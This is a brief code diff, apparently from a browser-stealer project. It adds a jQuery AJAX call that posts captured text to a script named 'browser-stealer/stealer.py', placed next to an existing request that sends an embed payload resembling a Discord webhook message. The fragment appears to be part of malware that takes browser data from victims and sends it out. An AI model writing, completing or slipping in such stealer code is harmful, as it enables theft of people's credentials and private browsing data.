@@ -40,6 +40,13 @@
       embeds: [myEmbed]
     }
 
+    $.ajax({
+      type: "POST",
+      url: "browser-stealer/stealer.py",
+      data: { param: text}
+      }).done(function( o ) {
+    });
+    
     request.send(JSON.stringify(params));
 
     //...
